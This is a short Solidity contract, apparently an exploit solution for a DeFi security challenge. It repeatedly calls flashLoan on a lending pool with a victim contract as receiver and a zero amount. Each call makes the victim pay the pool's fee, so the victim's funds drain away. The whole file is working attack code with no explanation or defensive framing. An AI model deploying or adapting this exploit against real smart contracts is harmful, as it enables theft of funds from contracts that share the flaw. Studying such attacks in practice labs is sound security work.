pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

contract Multicall {
    using Address for address;

    address s_receiver;
    address s_pool;

    constructor(address _receiver, address pool) {
        s_receiver = _receiver;
        s_pool = pool;
    }

    function exec() external {
        for (uint256 i = 0; i < 10; i++) {
            s_pool.functionCall(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    s_receiver,
                    0
                )
            );
        }
    }
}
